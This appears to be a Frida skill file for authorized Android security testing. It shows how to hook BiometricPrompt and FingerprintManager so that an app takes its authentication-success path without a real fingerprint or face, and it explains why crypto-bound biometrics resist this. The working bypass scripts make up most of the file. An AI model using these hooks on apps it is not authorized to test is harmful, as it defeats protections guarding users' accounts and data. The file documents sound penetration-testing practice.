---
name: biometric-bypass
description: Neuter Android BiometricPrompt / FingerprintManager result callbacks to force an authentication-success path, for authorized testing of apps whose biometric gate is not cryptographically bound.
---

# Bypass BiometricPrompt / keyguard checks

**Authorization:** Frida is for software you are authorized to analyze — your own
apps, permissioned engagements, CTFs, research. Only do this on apps you are
permitted to test.

**When to use:** the app gates a feature behind a fingerprint/face prompt and you
want to reach the post-auth path without a real biometric. This works when the app
treats "success" as a *boolean/callback* rather than unlocking a keystore key with
the biometric — see the crypto caveat below.

## What the check looks for

`BiometricPrompt.authenticate(...)` invokes an `AuthenticationCallback`:
`onAuthenticationSucceeded(result)` on success, `onAuthenticationFailed()` /
`onAuthenticationError(...)` otherwise. Apps branch on which callback fires. The
bypass forces the success callback to run.

## Shortest working example — invoke onAuthenticationSucceeded

Hook `authenticate` and immediately call the success callback with a null result:

```js
Java.perform(() => {
  const Prompt = Java.use('android.hardware.biometrics.BiometricPrompt');
  Prompt.authenticate.overload(
    'android.hardware.biometrics.BiometricPrompt$CryptoObject',
    'android.os.CancellationSignal',
    'java.util.concurrent.Executor',
    'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
    .implementation = function (crypto, cancel, exec, callback) {
      console.log('[bio] forcing onAuthenticationSucceeded');
      const Result = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
      // result can be null for apps that ignore it:
      callback.onAuthenticationSucceeded(null);
    };
});
```

## AndroidX / FingerprintManager variants

Cover the Jetpack and legacy APIs the app might use:

```js
Java.perform(() => {
  // AndroidX BiometricPrompt
  try {
    const X = Java.use('androidx.biometric.BiometricPrompt');
    X.authenticate.overloads.forEach(ov => {
      ov.implementation = function () {
        console.log('[bio] androidx bypass');
        // fall through to original then trigger success if the app exposes it
        return ov.apply(this, arguments);
      };
    });
  } catch (e) {}

  // Legacy FingerprintManager callback
  try {
    const CB = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationCallback');
    CB.onAuthenticationFailed.implementation = function () {
      console.log('[bio] swallow failure'); /* do nothing */
    };
  } catch (e) {}
});
```

## Pitfalls

- **Crypto-bound biometrics can't be faked.** If the app passes a real
  `CryptoObject` and later uses that `Cipher`/`Signature` (unlocked only by a
  genuine biometric) to decrypt/sign, forcing the callback yields an uninitialized
  crypto object and the operation fails. That design is *not* bypassable this way —
  the biometric materially unlocks the key.
- **Right overload.** `authenticate` has several signatures across API levels;
  enumerate with `.overloads` ([java-overloads.md](java-overloads.md)) and hook
  each.
- **Result object needed.** Some apps read fields off `AuthenticationResult`;
  passing `null` then NPEs — construct or `Java.choose` a real result if so.
- **Callback class is abstract.** Hook the concrete subclass the app registers, or
  the app-side handler method, when the framework class hook doesn't take.
